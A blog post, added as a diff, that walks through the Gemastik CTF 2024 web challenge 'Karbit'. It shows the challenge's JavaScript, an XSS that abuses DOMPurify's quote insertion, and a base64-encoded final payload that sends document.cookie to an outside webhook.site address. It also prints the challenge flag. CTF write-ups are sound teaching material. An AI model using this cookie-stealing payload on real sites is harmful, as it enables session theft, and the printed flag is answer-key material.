@@ -1,0 +1,171 @@
+---
+title: Gemastik CTF 2024 - Karbit
+date: 2024/8/6
+description: Exploiting the popular XSS sanitizer
+tags: [web, xss]
+---
+
+## Challenge Description
+
+Setelah bertahun tahun menjadi orang normal, akhirnya kamu berkesempatan untuk menjadi raja Karbit. Tapi, untuk menjadi raja Karbit, kamu harus menyelesaikan tantangan yang diberikan oleh raja Karbit sebelumnya. Kamu harus bisa membuktikan bahwa kamu bisa mencuri data rahasia dari raja Karbit sebelumnya. Curi data tersebut dan buktikan bahwa kamu layak menjadi raja Karbit.
+
+**Author**: Dimas Maulana
+
+[dist.zip](/images/posts/gemastik-ctf-2024-karbit/dist.zip)
+
+<details>
+	<summary>TL;DR</summary>
+	There's a mistake in using the `DOMPurify.sanitize()` function where it automatically adds `"` in certain cases that
+	we can use to execute XSS.
+</details>
+
+## Initial Analysis
+
+This is what the website looks like:
+
+![web](/images/posts/gemastik-ctf-2024-karbit/web.png)
+
+Every time we claim a waifu, this website saves the waifu image URL in the URL as a hash. The hash is in base64 format.
+
+Here's an example: http://ctf.gemastik.id:9012/#L3FHdVJsZEQuZ2lm
+
+If we try to decode the hash, it forms a path to the waifu image:
+
+![base64](/images/posts/gemastik-ctf-2024-karbit/base64.png)
+
+Then I checked the JavaScript source code:
+
+```html filename="index.html" copy
+<script>
+	const waifusContainer = document.querySelector(".waifus");
+	const claimedWaifusContainer = document.querySelector(".claimed-waifus");
+	const REGEX_SAVE_PROPS = /['"]/;
+	const initialHash = location.hash ? atob(location.hash.substring(1)) : "";
+
+	function createWaifuCardHTML(file, buttonText, buttonAction) {
+		const sanitizedFile = DOMPurify.sanitize(file);
+		const imgHTML = `<img src="${sanitizedFile}" class="card-img-top">`;
+		const buttonHTML = `<button class="btn btn-outline-light" onclick="${buttonAction}('${sanitizedFile}')">${buttonText}</button>`;
+		return `<div class="card text-center waifu-item">${imgHTML}<div class="btn-container">${buttonHTML}</div></div>`;
+	}
+
+	function throwAlert(message) {
+		document.location.hash = "";
+		alert(message);
+		document.location = document.referrer;
+	}
+
+	function claimWaifu(file) {
+		const sanitizedPath = DOMPurify.sanitize(new URL(file).pathname);
+		let currentHash = location.hash ? atob(location.hash.substring(1)) : "";
+		const currentPaths = currentHash ? currentHash.split("|") : [];
+		if (!currentPaths.includes(sanitizedPath)) {
+			currentPaths.push(sanitizedPath);
+			location.hash = btoa(currentPaths.join("|"));
+			displayClaimedWaifus(currentPaths);
+		}
+	}
+
+	function removeWaifu(file) {
+		const sanitizedPath = DOMPurify.sanitize(new URL(file).pathname);
+		let currentHash = atob(location.hash.substring(1));
+		const currentPaths = currentHash.split("|").filter((p) => p !== sanitizedPath);
+		location.hash = btoa(currentPaths.join("|"));
+		displayClaimedWaifus(currentPaths);
+	}
+
+	function displayClaimedWaifus(paths) {
+		if (REGEX_SAVE_PROPS.test(initialHash)) {
+			throwAlert("Invalid characters detected in the hash. Please try again.");
+		}
+		let claimedWaifusHTML = "";
+		paths.forEach((path) => {
+			const file = `https://i.waifu.pics${path}`;
+			const cardHTML = createWaifuCardHTML(file, "Remove", "removeWaifu");
+			claimedWaifusHTML += cardHTML;
+		});
+		claimedWaifusContainer.innerHTML = claimedWaifusHTML;
+	}
+
+	document.addEventListener("DOMContentLoaded", () => {
+		fetch("https://api.waifu.pics/many/sfw/smile", {
+			method: "POST",
+			headers: {
+				"Content-Type": "application/json",
+			},
+			body: JSON.stringify({}),
+		})
+			.then((response) => response.json())
+			.then((data) => {
+				let waifusHTML = "";
+				data.files.slice(0, 16).forEach((file) => {
+					const cardHTML = createWaifuCardHTML(file, "Claim", "claimWaifu");
+					waifusHTML += cardHTML;
+				});
+				waifusContainer.innerHTML = waifusHTML;
+			});
+
+		const initialPaths = initialHash ? initialHash.split("|") : [];
+		displayClaimedWaifus(initialPaths);
+	});
+</script>
+```
+
+Here's the JavaScript execution flow:
+
+1. Get the claimed waifu image paths if they exist in the URL hash
+2. Then insert each path into the `src` attribute of the `<img />` tag
+
+So from that, we should be able to inject XSS into the URL hash. The problem is we can't put `"` to escape from the `src` attribute because there's protection from `REGEX_SAVE_PROPS` that blacklists `"` and `'` characters.
+
+It looks like it's impossible to exploit XSS here, right?
+
+Turns out, we can exploit the `DOMPurify.sanitize()` function to automatically add `"`.
+
+For example, if we try to input this into that function:
+
+```js
+DOMPurify.sanitize("<img src=url />");
+```
+
+then the HTML element that will be rendered becomes like this (notice that " will be automatically added):
+
+```html
+<img src="url" />
+```
+
+## Solution
+
+Now, from that theory we can already create the payload. Focus on this part:
+
+```js
+const imgHTML = `<img src="${sanitizedFile}" class="card-img-top">`;
+```
+
+So the suitable payload is this:
+
+```html
+<img src=onerror=alert(`xss`)// />
+```
+
+Because if that payload is sanitized, this is the output:
+
+![payload](/images/posts/gemastik-ctf-2024-karbit/payload.png)
+
+Okay cool, now we just need to encode it with base64 in cyberchef then try to put it in the URL hash, and...
+
+![xss](/images/posts/gemastik-ctf-2024-karbit/xss.png)
+
+Now, let's get the flag. There's an admin bot page at `/report`, and the flag is also at http://proxy. Let's design the final payload:
+
+```
+http://proxy/#PGltZyBzcmM9b25lcnJvcj1mZXRjaChgaHR0cHM6Ly93ZWJob29rLnNpdGUvZWVjNGM4YWQtODliMi00ZDRmLWE2NDYtM2M1MGM3NTViMDQzP2ZsYWc9JHtkb2N1bWVudC5jb29raWV9YCkvLyAvPg==
+```
+
+Got the flag:
+
+![flag](/images/posts/gemastik-ctf-2024-karbit/flag.png)
+
+## Flag
+
+`gemastik{S3l4m4t_anda_t3lah_m3nj4d1_r4j4_karbit}`
